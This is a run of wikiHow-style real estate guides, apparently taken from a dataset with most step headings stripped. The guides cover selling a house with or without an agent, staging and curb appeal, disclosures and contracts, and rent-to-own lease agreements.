For any subsequent renewals, you will need 30 hours of continuing education, including a 3-hour core course, and a minimum of 15 hours must be completed within 24 months of your renewal date., Getting into the field is the first step in your new career. You'll need to decide whether you want to join a company or work solo. Know the pros and cons of each, and what factors to consider.


If you want to join an office, make sure the office fits your goals and philosophy as a real estate agent. Ask during an interview, or before, what the vision is for the company and what values they represent.
If you're joining a company, consider how much you will make off commission, how many listings the company has, and whether there are any formal opportunities for training and mentoring.Going into the market independently means more flexibility, lower costs, more input on your part, and gaining local credibility in the marketplace. If you're successful, you could end up making more money as an independent agency.
Working without an agency does mean you work in a smaller network with less support and guidance, and there are fewer formal training opportunities."

Try to close cleanly and quickly.",How to Sell Your Own House," As soon as you decide to sell your house, thoroughly clean it from top to bottom. Don't forget rarely-cleaned areas such as baseboards, blinds, roof gutters and window wells. A clean home will help an appraiser see your house in a better light and value it more highly, as well as appealing to buyers.


Because of familiarity, you're likely to overlook some aspects of cleaning that scrutinizing potential buyers won't. If you want to make the best possible impression, shell out some extra cash to hire a professional cleaning service, at least for an initial deep clean. Don't underestimate the power of a spotless canvas.
Clear up clutter while you clean. Make your home look more spacious by getting rid of any unnecessary junk (hire storage space if you have to). You'll see a big difference in how your closets look, as well as your garage, porch and bathroom. Buyers want to feel like they're purchasing sufficient space, and clearing out more of your stuff helps them see themselves in your home. If you can't bear to part with anything, consider moving the items to a storage unit temporarily.;
, As much as you'd like to set the price of your home as high as possible, you have to be realistic. Many for-sale-by-owner listings fail to sell because owners persist in thinking their home is worth more than the market will offer, or because they have already settled on a set amount of money that they want and refuse to budge. Having a professional, third-party assessment of your home's worth will help you get comfortable with a price range, in addition to providing you with a solid reference point if a buyer or Realtor accuses you of setting the price too high.


Don't just rely on the property tax assessment. Many property tax assessments are out of date, and they don't necessarily reflect the current real estate market.
Look at comparables. Comparables are what other similar homes in your area are selling for, or better yet how much they have sold for in the last month. Use this method to determine what price range your home will fall in. Always use comparables when arriving at a realistic assessment of your home's value. In a slower market or in a rural area, you may even want to look back about six months to a year to see how other homes sold around that time compared with your home.

Hire an appraiser. A certified residential appraiser will come to your house, measure the property, take notes and photos, research information about any land parcels, and assemble a list of comparable sales in your neighborhood to determine the value of your home. Many banks keep a list of reputable appraisers they contact for refinancing or mortgage loans; ask your local branch manager to refer you to an honest, qualified professional. Once you receive your copy of the appraisal, make a second copy and store it in a secure location. Keep the first copy on-hand to go over with serious buyers. Keep in mind that a visit from an appraiser may cost you around $500, while a visit from a Realtor may be free or only around $50 and they may arrive at a similar amount.

, Many standard real estate contracts are going to give the home buyer the right to inspect the property, so be prepared. Have your home inspected before you advertise. Under a general inspection you might be obligated to make major repairs to appliances, plumbing, septic, electrical and heating systems, etc. You can expect your home’s roof and foundations to be inspected, as well. Follow the recommendations and make necessary repairs. Additional inspections requested by the buyer are customarily at their expense.

, If they feel like they'll need to do extra landscaping, plumbing, appliance and electrical work before they can enjoy the house, they'll balk when it comes to buy, even if the rest of your house is an absolute steal. So make it easy for them. Hire a handyman or general contractor to get the home as ready to move into as possible.

, Before you start marketing your home, write up a list of special selling points you think will attract buyers. Potential items include good school districts, recent renovations, benefits that have been grandfathered into the property, energy-saving windows or insulation and new appliances. Highlight these items in your ads, when you talk to people about your home or while you're showing it. Memorize them so that you don't forget anything.

, Be aware that the real estate sector sees a noticeable uptick in business over the summer — people prefer to move when it's warm, and they're reluctant to have their children change schools in the middle of the school year. Start trying to sell your home in April or May and continue to promote it throughout the summer. If you haven't sold it by late fall, scale back your efforts and begin marketing more intensely when the weather warms up again.


Another thing to be aware of is the trend your neighborhood is going through. If your neighborhood is undergoing a mini boom of strong residential sales, those transactions will increase the value of your home. Conversely, if your neighborhood has seen a lot of short sales or foreclosures, your home's value will be decreased. Try to time your listing so that you're not affected by distressed sales. For instance, in robust markets, a comparable sale can only weigh against the value of your home for 90 days after the sale date or even as little as 30 days. It might be worth it to wait a few months to list your home if you can do it at a higher price. However, in slower markets, you may have to go back as much as a year.

, A staging is an especially important part of selling your house. During the staging, potential buyers begin mentally imagining their own items, and their lives, in your home. If they can't make the imaginative leap because the house is too cluttered, dirty, colorful, or quirky, you've probably lost their business. Best to stage the house to be as spacious, clean, bland (yes, bland!), and typical as possible.


Try to limit furniture in your house to the absolute essentials. If you haven't used it in three months, store it, sell it, or throw it away. This helps the rooms appear larger. Replace or hire replacement for items that are outdated or don't complement your home.
Show items in groups of 1, 3, and 5 items, erring on fewer items when possible.It's not clear why odd groups of items are mentally appealing, but they are. Freshen up rooms with fresh flowers and bowls of fruit. Use scatter cushions and glass vases to liven up the room.
Go into each room and paint as needed. Paint the walls white to brighten up your home. Remember, neutral is best when you’re selling so potential buyers can customise the property to their tastes. Check the carpets and windows in each room and clean as well.
Don't neglect bathrooms and the kitchen. Use fluffy white towels in the bathroom and even put an orchid in there. Don't have too many appliances and or pots and pans visible in the kitchen, a bowl of fruit and 1-2 appliances/pans are more than enough for the kitchen to look homely but not crowded.
Remove any personal photos and items - these tend to make buyers uncomfortable.
The style of your house should appeal to the demographic of your potential buyers. For example you will use different property styling if you're selling a bachelor pad or a family home. And remember: if your house is decorated in a very specific style, this might not match the style of your potential buyers.
Pay attention to how the outside of your home looks. Clear away any plants that obscure significant parts of the home, weeding and mulching as necessary. Check in on the condition of the paint on the outside of the home; inspect how it looks from both the curb and up-close. Invest in potted plants and place them at the entry or on the balcony/courtyard. Put yourself in the shoes of the buyer!
Take professional photos that show the best of each room (and outside area). If you have a room bathed in sunlight, take a picture of that room on a sunny day (early morning or late afternoon), even if the photographer wouldn't approve. In other rooms, turn on all artificial light when taking pictures, even if there is enough light - it creates a special ambiance.

, Staking a ""For Sale By Owner"" sign in your yard is good if you live in a high-traffic neighborhood, but you can go further.


Advertise online. Put an ad for your home on a website like Craigslist. Take out classified ads in your local newspaper and ask if they'll be available on a website as well. If you use social media sites, mention often that you're selling your house.
Put up fliers. If local ordinances permit it, place fliers on stoplight poles at prominent intersections.
Fish out potential buyers. Call local bank managers, as well as school principals, and let them know that you have a great home for sale if they know a family who's looking. If you know that a nearby company often relocates workers to your area, contact their recruiting or human resources department and tell them you have a home you're ready to sell. Do whatever you can to get the word out.
Rely on word of mouth. Alert your friends, family and business associates that you're selling your house. If you need to sell quickly, offer them a carrot — say that if they can find someone who's looking for a house and that buyer makes an offer, you'll buy them an expensive bottle of wine, a nice dinner out, or some other reward.

, When potential buyers or their Realtors contact you and want to see the home, try to be as available and flexible as possible. Be aware that many people will want to see the home in the middle of the day, when you might be working. If you can't be home for appointments, try to arrange for a close friend or family member to be there.


Set a peaceful, enticing mood. Before your potential buyers arrive, quickly clean up any clutter. Put away food on the counter, throw dishes into the dishwasher, and gather up laundry. Light a scented candle if you have one, brew fresh coffee or put a few drops of vanilla on a cookie sheet and put it in the oven at around 250 degrees Fahrenheit (120 Celsius). Put some light, soft classical music on in the background. If the weather is nice, open a few windows; if not, light a fireplace or turn the heater up a bit. Turn on the lights for mood lighting. These extra little steps will make your home seem inviting and calm.
Be a good host. This might seem like obvious advice, but some people are so anxious about selling their home that they forget basic etiquette. When your potential buyers arrive, greet them with a firm handshake and look them in the eye. Introduce yourself, and ask and remember their names. As they step inside your home, ask if you can provide them with a glass of water or light refreshment. Home in on their interests (i.e., do they have kids? Do they like animals?) and talk about the house in those terms. Lead them from room to room without rushing. At the end of the tour, ask if they have any questions or if they'd like to see anything again. Have your contact information ready to give them on a small note or card. Coming off as polite and prepared will make you seem like someone with whom they could enter a real estate transaction with minimal hassle.
Keep it positive. Be honest, but do not dwell on the home's flaws or offer apologies like ""Sorry it's so messy in here!"" If you're selling your house because of a divorce, lost job or other personal tragedy, do not discuss these issues with your buyers, even in jest (i.e., ""I could have kept this house if my husband could have kept his pants up!"") Make your entire interaction with them as positive as possible. You want them to leave your home feeling happy and excited at the possibilities.
Secure your valuables. Lock up everything truly irreplaceable in a safe location before you open your home to strangers. Don't let your buyers walk around unsupervised; if they ask for a moment alone, try to give them some privacy in the yard or the kitchen.

, Many sellers price their homes too high. And then they keep them too high for too long, all while paying for maintenance, upgrades, and property taxes. Before you start in earnest, set a timeline for how you'll lower the price of your home if you're not getting any bids: ""If I haven't gotten a bid within two months, I'll lower by $25k; and if I haven't gotten a bid within 6 months, I'll lower by another $75k,"" for example. Having a pre-determined outline of how you'll lower the price in the absence of bids will help take emotion out of the decision and ultimately help you sell you house more quickly.

, Take a walk around the neighborhood if you aren't getting any bids. Put yourself in the buyers' shoes and ask yourself, would I want to buy my home or another home given their prices? Remember to be as honest with yourself as possible. If you come to the conclusion that other homes around the neighborhood might be better options, it's time to lower your asking price in order to make your home more appealing.

, Find a way to sweeten the pot a bit. Don't underestimate the power of a small rebate, a security blanket, or simply a kind gesture. Here are some things that you can do to make the deal more attractive:


Offer a credit on the closing costs, or offer to pay them entirely.Closing costs can get expensive quickly (upwards of several thousand dollars), so this becomes a great incentive.
Give a transferable home warranty to cover home appliance malfunction. These typically only cost $300 to $500, but give the potential buyer peace of mind that if anything goes wrong, they won't have to shell out extra for it.
Offer expedited closing on the home. Many buyers who see their dream house want to live in it right away. If you can assure potential buyers that closing will only take 30 to 60 tops, this could swing the balance in your favor.

, Most sellers assume that the buyer has been through the process and know the stages of buying a home. The fact is, that this is one of the many valuable services that a Realtor would normally provide, but now it is left to you, the seller, to walk them through choosing a mortgage broker to getting to the closing table. By aligning yourself with a local mortgage company first, you are giving the loan officer leads in return for assisting you with the transaction, a virtual win-win. Mortgage brokers often have clients that are approved but have yet to find a home; this is a great way to tap into their client list to find a qualified buyer.


The broker should also estimate the closing costs for your home and give you strategic financing tips for marketing (Zero Down, 2-1 Buydown options, Interest only options or community funding & grants available). Financing can sell a home just as quickly as good staging.
A lender may also prepare a flyer that lists the monthly payments based on the expected purchase price.

, If a buyer says he or she likes your home but is not sure about buying it, again, this is your opportunity to sweeten the deal. Did you notice the buyer looking longingly at your new barbecue? Throw it in. Did they seem dismayed that the patio hadn't been varnished for a while? Say you'll come down $500 to cover the cost of re-varnishing. Giving up an appliance or making a small concession for home improvements could cost you less than continuing to pay a mortgage on a house you don't want.


Keep in mind that even if someone makes a low-ball offer, you can negotiate upwards. Do not be discouraged if you get an offer that is lower than what you are willing to accept.

, Once the buyer is making offers and negotiating, try to close the transaction as quickly as you can. Make sure you've provided all the necessary disclosure documents required by your state. If you don't like the buyer's offer, don't just say no. Always make a counter offer. Try to accommodate the buyer wherever you can afford to. Also, consider taking the offer to a lawyer for professional evaluation. Once everything is settled, move out as quickly as you reasonably can.

Add Plant Life.,
Improve The Driveway.,
Clean Up The Face Of The House.,
Create An Exterior Focal Piece.",How to Add Curb Appeal to Your House," One of the cheapest and most overlooked ways to boost the curb appeal of a property is by adding a new mailbox. When trying to find your open house, the prospective buyers will be searching for the your house number. Most of the time, they will find it by seeing it posted on the mailbox.


If your mailbox is rusty and falling apart, and has old, unreadable numbers, they might be immediately turned off. Take the time to buy a new mailbox, or slap on a fresh coat of brightly colored paint to evoke a great first impression. You could even match the color to that of your front door, which leads us to the next step.;
, Not every buyer might notice the tiki torches you used to border the pool, but you can be sure that every one of them will see the front door. At the very least, paint the front door a bright color.


If the door is in poor condition, you might even consider investing in a new one.
Make sure you buy new door hinges and doorknobs as well.
Additionally, you might consider improving or installing a walkway leading up to the front door.
Finally, line the walkway with cheap LED solar powered lights for a great effect.

, One of the biggest turnoffs for potential buyers is a lifeless front yard. If you are selling your house when the weather is nice out, try to improve the greenery. In addition to mowing the lawn, there are a number of different ways to do this. You could plant beds of flowers or small bushes along the sides of the house and driveway. You might even consider buying a few potted plants to make the doorway or porch feel more warm and lively.

, Although it can be expensive, improving the driveway will add to the value of your house. A cracked driveway is most commonly fixed by hiring a team for a repave. Additionally, you can add a great classy look by installing a border to the driveway. If you are working with a smaller budget, a clever trick to make a driveway look brand new is by hosing it down. A quick spray before the open house might make a big difference on the first impressions of the prospective buyers.

, There's nothing worse that a house with peeling paint and ugly features. You could improve the front of the property by: painting the exterior, adding vinyl siding, painting or installing a trim, painting the porch, garage, and shutters, cleaning the roof, power washing the exterior and porch, cleaning or installing new windows and new gutters, and buying a new set of address numbers.

, While most of the other steps are more or less essential, this one is optional. If you have some extra money in your budget and you don't know what you should spend it on, consider adding a focal piece to the front yard. Cheap items like an Adirondack chair on the porch, an arbor in the garden, or a new set of patio furniture might be just what you need to make a difference.

See below for instances where you might need an attorney. You would have to pay only for legal services actually rendered, as opposed to paying a commission to an agent.;
, Prior to deciding to self-list, speak with at least one real estate agent. Get a sense of what they can do by asking about their years of experience, average time to find a buyer, how their services would relieve you of liability, suggested pricing, and why they think you should sign up with an agent rather than selling on your own. Naturally they will favor hiring an agent, but at least consider what they have to say. They do offer value for what you pay them. Also, keep in mind that the agent you hire to list your house may not be the one who sells it.


The average self-listing often achieves the asking price while avoiding the agent's commission of 6% or more. A 2008 Consumer Reports study found that nearly all homeowners in their survey who sold on their own got their asking price, while sellers using agents received an average of $5,000 below their asking price. Similarly, National Association of Realtors figures show the average sales price in by-owner listings was 97.5 percent of the asking price — while sellers with agents got just 95 percent. This may also be due in part to agents negotiating on behalf of their buyers and sellers raising the price to cover the real estate commissions.
Not all agents are equal. Not everyone has the same experience, expertise and dedication toward maximizing their clients' selling price. Before you decide whether to sell on your own, ask a prospective agent questions that concern you. Ask for references, too.

, There are certain times of the year more likely to yield a profitable sale. Generally you want to sell when the weather is good, before school begins and not near the December holidays.


In the U.S. some suggest that the week after the Super Bowl is the best time to list your home (meaning February). While studies show that this time is ideal and has the most buyers, it also tends to be the time of year with the most sellers. Some find that the spring is the best time to list.
It will be more difficult to sell a family-sized home at an advantageous price once school has started. After all, it can be tough for families with children to change schools mid-semester.

, Sooner is generally better if you want to ""beat other homes onto the market,"" but think about the weather. Depending on your location, you may have excessive cold and/or snow to deal with. How does your yard look with two feet of snow? Would your home look better in the spring when your yard and landscaping are at their most appealing? If the yard is not that great looking, then your home might look more appealing when the yard is covered in two feet of snow.


Weather-related websites or newspaper offices can provide you with historical data regarding the best time of year to sell in your area. Keep in mind that job relocations occur throughout the year.

, One way to do this is to hire a professional real estate appraiser. This person will objectively seek out properties similar to yours and research the prices of recent sales. You can do this research yourself, because there are several websites that provide recent home sales data by geographic location.


You can price the house on the high side for awhile, and if you aren't seeing any interest, you can lower the price. Buyers will be expecting a lower price since they know you are selling without an agent. You do not want your home to become ""stale"" from sitting too long on the market because you priced it too high.

, When packing things for your eventual move, be sure to leave essentials. Remember you may still need to sleep, eat, and live in this home in the short-term, but now is the time to remove anything which is not essential. If you are not taking something with you, give it away, sell it, or trash it.


Extra furniture and items of clutter make homes look smaller and give the impression that there is less room than there is. Children should choose a limited number of toys, then pack the rest. If necessary, the toys can be rotated.

Store it! Lots of companies specialize in storage, from off-site storage units to companies that pick up and drop off storage units at your door. This way you can get rid of all non-essential furniture, silverware, books, etc.
Sell or donate. Although some of your things may not be coming with you, it may be difficult to part with items you feel are valuable. Give yourself a budget and a time line, and try to sell these items until either the budget or the time have expired. In the end your life and your upcoming move are more important.

, Try to make your home ""neutral."" The idea is to let the buyers imagine themselves in the home without any overlays of your own preferences, beliefs, styles, etc.


Remove religious items and most, if not all, family photos.
Remove unique decorations, and paint in neutral colors. Colors which have universal appeal are typically tan, beige, and gray.
Clean and organize the house, including floors, carpets, closets, and windows.
Many sellers hire a professional stager to advise them about what to store and what needs to be painted, as well as how to furnish a room to make it look attractive to buyers.
If possible, make arrangements for pets, children, and other family members to be out of the house when it's being shown. Distractions may interfere with a buyer's ability to concentrate on the home. First impressions are formed quickly. Don't let your prospective buyer waste time looking at your photos or your pet.

, Do whatever repairs and clean-up required to make that first impression positive. It is particularly important to have the front entrance looking good.


In the winter make sure walkways and steps are shoveled and safe to walk on. Think about access to the backyard and detached garage, too.
In the spring and summer consider refreshing the home with paint, and plant flowerbeds or pots to make the home more inviting.

, As buyers will be wandering throughout your home, keep all valuables safely and securely locked up. Since you don't want to feel like you need to tail buyers while they look, cash and jewelry should be in a safe or simply well hidden.

, Various sites offer templates where you can customize the text and upload digital photos. Then put out a flyer box next to your ""for sale"" sign so potential buyers can read all about your property.


If you decide to list with an agent, he or she may prepare your flyers, videos and postcards. Keep in mind that this may not be included in the agent’s services. Be sure to ask them if they do these things before you list with them.

, This should include the approximate dates the improvements were made, especially for the roof and furnace. You might also make a list of all items to be excluded from the sale such as light fixtures. Include anything you would consider selling under separate negotiations.

, Prospective buyers will probably not be familiar with roads, schools or local transportation. Be prepared to answer questions about why you are selling.


Local Realtors have access to helpful charts about the community that they may be willing to share with you if you work with them.

, Some disclosures are not mandatory in the case of a ""For Sale By Owner"" (FSBO), but having such a document available can answer many buyer questions about your home. Appropriate disclosures include information on previous fires or floods. However, keep in mind that different states have different laws about disclosures, so check with your attorney to ensure that you have disclosed all of the necessary information.



Lead paint disclosure is mandatory even with a FSBO, so make sure you have a form for your home, particularly if it was built before 1978. This form can be obtained online at hud.gov.Disclosure forms are generally available online for your particular area (search ""Disclosure form, Michigan"" for example) and at your local office-supply store.Most real estate offices can provide you with all necessary disclosure forms, but only if you are using their services.

, Selling a home is about exposure, so anything that will expose your home to more people is beneficial. Consider the cost of local newspaper advertising, flyers, writing and printing property-information sheets, and taking the time to tell your neighbors and friends. Costs can add up quickly, so keep in mind what you are willing to spend.


Put a sign in your yard with your contact information. Place other signs around town, too, with your address and Open House hours. Choose busy locations for your signs.

, Choose your sites carefully, as many of them are designed mostly to promote themselves. If their home listings have not been recently updated, there may be several homes listed that are already sold. Buyers may get frustrated and never even notice your listing. Popular For Sale by Owner websites include Zillow, Owner.com, Hotpads and Trulia. Each of these sites can send your listing to Realtor.com. Advertise your home on Craigslist, and update the content whenever appropriate. Advertise on your Facebook page and LinkedIn. Email photos and information about your listing to everyone you work with (assuming this is permitted), and ask them to pass the information along to others.

, If you live alone, be smart. You probably shouldn't be the only one home when your house is open for viewing. Not everyone may be coming just to buy or look.

, Accept written offers only. If your buyer is serious, s/he will write up an offer and include a deposit. You need a contract for the buyer to use. You can find one online, or ask a real estate attorney for one. Remember that the buyer knows you won't be paying an agent's commission. As a result, s/he may try to negotiate a lower price than you'd like. Be prepared to defend your asking price with evidence of other recent prices in your area.

, Contract forms are available online or through an attorney, which is highly recommended. Consider the completed contract carefully before you sign it. Do so only if it has been reviewed and approved by a real estate attorney. The contract should be accompanied by a mortgage pre-approval from a qualified lender as well as the initial deposit check or money order. If they are a cash buyer, then request a bank letter indicating that they have the required amount of cash the same day that the offer has been made.


If you accept a ""contingency offer,"" typically that means you would have to wait until the buyer sells his/her own home before they can buy yours. That leaves you in limbo until the other party's home sells. You have no alternative but to start over if the buyer backs out of the deal once they experience difficulty in selling their own place.
Another typical contingency allows the buyer to back out if s/he does not like the results of the home inspection.
You may also include a bump clause that allows you to force the buyer to waive the contingency or rescind and allow you to sell if there is a backup offer.
Some typical types of contingencies include financing, appraisal, title, insurance, seller disclosures, neighborhood, feasibility, association, and any other event or idea that you would like to have named as a contingency. This allows the buyer to cancel the contract and get back their earnest money if the contingency is not waived or satisfied.

, You will want the buyer to put up a non-refundable deposit. Otherwise, the buyer could renounce the contract at any time, leaving you with no recourse but a lawsuit. It is common, however, to include a written stipulation that there are certain situations in which the deposit could be returned to the buyer, such as a bad inspection or the discovery of information that should have been disclosed to the buyer but was not.

, Have the contract and closing paperwork checked by your attorney immediately. Be sure that the mortgage papers and the deed are prepared properly for your protection. You will be signing over your rights to the other party, including the deed, so it has to be done correctly.

, If there are any title problems found after the closing, title insurance will be responsible for fixing them. The buyer's agent will arrange for title insurance. If you are not working with an agent, then you will have to open title with a title company and perform a preliminary title search. The buyer is responsible for buying an insurance policy for the lender and the seller buys one for the buyer.

, The buyer's agent may not have the knowledge to explain minor defects vs. major ones in a home. During inspection, anything the inspector points out is of concern (especially to a first-time buyer).


Be prepared to respond to the buyer's concerns. Inspection issues are a common reason contracts are rescinded. Without an agent to advise you on what is a reasonable issue and what is customary, you will need to discuss these things with an attorney. Ultimately, it always comes down to how badly you want to sell your home and how badly the buyer wants to purchase it. You may have to drop your price or offer to pay for repairs, unless the sale is listed “as is.” If certain repairs were not apparent to the seller, it would be appropriate to renegotiate.
Obtain a ""Certificate of Occupancy"" or ""Fire and Safety Inspection."" Check with your town clerk and find out which regulations you need to comply with. If you need a Certificate of Occupancy, find out what the inspector will be looking for. If you need only the fire and safety inspection, find out the requirements for the smoke detector, fire extinguisher and carbon monoxide detector so that when the inspector comes there will be no issues, and you will get the certificate you need for closing. Another test often required is for radon gas in basements. Do-it-yourself kits are available for this. Keep in mind that this varies from state to state so it is important to consult with an attorney.

, The bank making the loan to the buyer will want to appraise your property. Banks are not usually generous with appraisals. Without an agent to help you evaluate an appraisal, you will have to trust the appraiser to pick the right comparable properties.


If your home does not appraise as expected, discuss your options with your attorney and ask him or her to talk to the buyer's attorney. If you really need to sell, you may have to lower your price to the bank appraisal, even if that is below the contract price.

, Additional reasons may arise for not going through with the deal. The buyer may not be able to get their loan. Bank regulations keep changing, and it's getting harder to qualify. Buyers who use a non-bank or large, well-known reputable lender may be held up for days or weeks even when there are no real issues with their qualifying for the loan.


Sometimes circumstances change, and the buyers no longer qualify and can’t get the loan.
Inspection issues and the bank appraisal are contract contingencies. If you and the buyer cannot come to an agreement, the contract is canceled, and the buyer will get their deposit back. This can be costly to you, as not only is your home now “older inventory,” but another buyer may be concerned that there are inspection issues that they cannot see. In a declining market, the price you need to set when you go back on the market may be lower than your original price.

, This information needs to be sent directly to the attorneys who are preparing the closing. They must ensure that payment is made for the outstanding water bill out of the proceeds of the sale.

, If everything goes well and all contingencies are met, prepare to move. You are responsible for keeping the house in the same condition as when the buyers inspected it except for repairs or replacements you agreed to make. Buyers will go through the house again before closing, so make sure you plan to be moved out at least the night before.

, Floors should be swept or vacuumed and the inside of cabinets and the refrigerator wiped down. If you have leftover paint that matches the current paint on the walls, leave it in the basement or closet. Make sure the paint is not exposed to extreme temperatures and that it is out of the reach of children.

Correct major problems first, such as rickety stairs, broken windows, and leaks in the roof.At a minimum, the home needs to be habitable (livable). This means that you must provide sufficient heat and hot water to your tenant.The home should also be sufficiently safe, by having a deadbolt lock and locks on the windows.
States and municipalities create livable standards for rental property. Stop into your local housing authority or town office and ask for requirements.;
, Not every state allows rent-to-own agreements, so you should consult with a real estate attorney before putting your home on the market.You can find a real estate attorney by contacting your local or state bar association and asking for a referral.Also have the lawyer walk you through the process, even if you don’t want to hire them.
Of course, hiring the lawyer can make things easier on you. They can draft the lease option contract and negotiate on your behalf. They will also review required closing documents.

, Lease options are not that common. Perhaps for this reason, they typically receive an overwhelming response, so you will likely have plenty of potential buyers to choose from. You can advertise the home using the following methods:


Put up a sign on the property. Make sure to mention that your home is “rent to own.” Also state the monthly rent (if you’ve settled on a sum).
Place ads in the local newspaper or circular.
Advertise online. You can put an ad on Craigslist. Make sure that you have pictures of the inside and outside of your home to show.

, You’ll need to thoroughly vet any applicant. Accordingly, you should create an application that all interested buyers complete. Make sure your application requests the following:name
date of birth
Social Security Number
ID number (driver’s license, passport, etc.)
current address
previous addresses
employment history (name, contact information, dates employed)
gross pay at each job
bank accounts (name of the bank and current balance)
credit card debt
whether the applicant has ever been late with rent
criminal history
applicant’s signature authorizing a background check

, You need to look at potential buyers as potential tenants, and you don’t want to do a lease option with someone you wouldn’t rent to. Accordingly, you should do a background check on each applicant.


As far as the applicant’s credit history, you probably don’t want someone with serious credit trouble, but at the same time you may want to be lenient. Many buyers who choose lease options do so because they have some blemishes on their credit and want to improve their profile before applying for a loan.

, Any renter is taking a risk by entering a lease option contract. For example, you might lose your house during the rental period. In this situation, the renter loses out on the option to buy the home and will have to move. Accordingly, you can expect potential buyers to do their own due diligence on your credit history.Get a copy of your credit report and look for mistakes. Dispute any errors with the national credit reporting bureaus.
Pay off debts as best as you can. If you are selling your house because you’re in financial trouble, you can expect buyers to be leery of entering a contract with you. Accordingly, improve your credit profile by paying down debt.
Pay off all unpaid taxes and liens.

, It’s a good idea to contact a loan officer or mortgage broker to at least discuss the potential buyer’s prospects for obtaining a mortgage at the end of the lease. The longer the lease term, the more uncertainty there will be. However, you’ll want at least some idea whether or not your tenant can qualify for a mortgage when the option comes due.


You can also ask the potential tenant to contact a mortgage broker.Have the broker send you a letter explaining whether the tenant will qualify.
It’s also important not to enter a lease option agreement with someone who can never possibly qualify for a mortgage. Renting to this person borders on a scam.

, Your tenant will lease your house for a certain amount of time. Generally, most contracts last one to three years.You want to give your tenant sufficient time to save a down payment or clean up their credit so that they can secure financing.

, Find out the market rent for a home of your size. Look for comparable properties in terms of size, location, and amenities (pool, garage). In your lease agreement, might sure to identify the date rent is due, as well as what methods of payment you will accept.


Also decide how much of the monthly rent you want to apply to the purchase price. This is called the “rent credit.” For example, you can decide that 25% of the rent will be applied as a down payment.If the tenant pays $1,000 in rent for three years, then $250 a month for 36 months ($9,000) will be applied.
If you choose to apply a portion of the rent to the down payment, then you should charge above-market rent.

, Identify how much you want from the tenant as a security deposit. Also explain what you can use the security deposit for, such as to repair any damage to the property. Additionally, you should explain that the tenant will forfeit any deposit if they break some provision in the lease., There are two options you can give the buyer. Choose which one works for you:


Lease-option agreement: this means the renter has the option (but not the obligation) to buy at the end of the rental period. This choice gives your tenant more control.
Lease-purchase agreement. This means your tenant is obligated to buy at the end of the rental period. If they don’t, then you can sue.Most tenants will resist this option, though it gives you protection.

, The option is the amount of money your tenant will give you to secure their option (i.e., their right to buy the home). There is no standard rate, and you and your tenant can negotiate the amount. Generally, options are around 3% of the purchase price, though you can go higher or lower.For example, if the purchase price is $150,000, then you might want your option to be $4,500.


Also decide whether the option fee is refundable. Typically, it isn’t.Accordingly, if the tenant decides not to exercise their option, you pocket the money.
Make sure to agree whether the option paid will be applied to the price of the home. Generally, it does.

, The option usually begins when the lease agreement is signed and ends when the lease agreement expires.Also tell them how they can exercise the option, e.g., through a letter mailed to your home address.


You can also grant an extension. For example, the tenant might not be creditworthy by the expiration of the option. However, if they are working diligently to qualify for a mortgage, you might want to extend the option.

, Your contract will explain how you will determine the purchase price of the home. For example, you and your tenant can agree on the purchase price when you sign the contract. In this situation, you might want to set the price a little higher than the home’s market value to account for rising property values.You can also agree that you’ll set the price when the lease expires.
Choose the option that works best for you. In a real estate market with rising prices, you might want to choose the second option.

, During the lease, your house might need repairs. If you want the tenants to pay for them, then include language in the contract to this effect. Typically, home owners make tenants responsible for minor things like mowing the lawn and basic interior or exterior maintenance. However, the tenant typically doesn’t do major repairs, such as replacing the roof or foundation. You can also set a dollar amount per year in maintenance.As the home owner, you can also require the buyer to pay property taxes, insurance, and homeowners association fees. However, you might want to continue to pay them since you are ultimately responsible for them until the sale goes through.As the landlord, make sure you get landlord’s insurance.Talk to an insurance agent.

, Your tenant will want a promise that you won’t do a reverse mortgage or get a home equity line of credit. If you did, then you might lose your home if you default on the loans. In that situation, the buyer will lose out on the chance to buy the house.

, Since this is a legal contract, it’s best to use a lawyer or at least have a lawyer review your draft to identify anything missing. If you didn’t hire a lawyer, then you’ll need to draft your agreement. You can find sample contracts online.A lease option agreement is, at base, a typical rental agreement, so make sure you include all of the terms you would normally have in a lease agreement, such as reasons to evict someone., Your contract won’t be legally binding until you and the buyer both sign it. Once signed, distribute a copy to the buyer and either give the original to your lawyer or store it in a safe place, such as a safety deposit box.

, As you collect your tenant’s monthly rent payments, you need to accurately record the amount paid and the date. Accurate records are particularly important if you are applying a portion of the rent to the purchase price. Keep a spreadsheet and enter the information in a timely manner.

, As the expiration date for the option approaches, you should be in contact with your tenant. Ask them whether they are considering purchasing your home. If they are, then they should begin investigating mortgages, since they will need to finance the purchase. Some tenants might need to be gently nudged to assess their credit score.

, If the tenant exercises the option, you can go ahead with the sale. Contact your real estate lawyer to draw up the paperwork. Your tenant will need to secure a mortgage, so account for the time that typically takes. To sell the house, the buyer should undertake all of the regular due diligence:home inspection (even if you had one before signing the lease)
other inspections (pest inspection, roof inspection, etc.)
appraisal
title search
mandated disclosures about the house

, Of course, your tenant might choose not to exercise their option.If so, you can decide whether to rent the home, enter another lease option, or try to sell it outright. If you liked renting, you might enter another lease option.


Review your contract to see if you need to refund any of the rent credit to the tenant. You should have drafted the agreement so that you don’t.

Negotiate a good lease option.",How to Choose the Best Way to Sell Your House," Selling a house is a long and complicated process, with many boxes to check along the way. The house has to be priced properly, listed, advertised, shown to buyers, and sold through a contract. The benefit of hiring an agent is simply that the agent takes care of these things for you. With an agent, you allow her to do the grunt work. You can rest easy knowing that everything will probably be done correctly and that your agent will help you get the most out of your home (her commission depends on it!).


An agent can also help you in preparing your home to be shown to buyers, as she knows what buyers are expecting and looking for in a home. This may include placing show furniture or giving certain rooms a fresh coat of paint, among other things.Real estate agents are never legally required in the sale of a home. However, some states require that a real estate attorney finalize the sale documents. Check your state's regulations before you try to sell a home entirely on your own.;
, The primary advantage of doing a for sale by owner (FSBO) is that you don't have to pay the agent's commission, which is regularly as high as six percent. Because of these potential savings, about 10 percent of sellers choose to go the FSBO route.Additionally, when you are selling a house yourself, you will have an easier time scheduling visits of the property, because you don't have to work around the agent's schedule. Finally, a FSBO allows you to meet the sellers in person, which is an advantage in negotiation and, if you feel strongly about the house, can be a good chance to get to know the people who will be living in it.Avoiding the agent's commission doesn't always guarantee that the seller will get more for the home. In some cases, a buyer will offer less for a FSBO home because they know the seller isn't paying agent fees. Additionally, a buyer with an agent may request a commission for their agent, which is usually three percent of the purchase price, however, this is a negotiated item.Keep in mind that if the seller interacts with the buyer, then they may reveal things about their situation that might have a negative impact on the sale. For example, if the seller reveals that they are relocating for a new job, then the buyer will know that the seller is hoping for a quick sale and may take a lower offer.

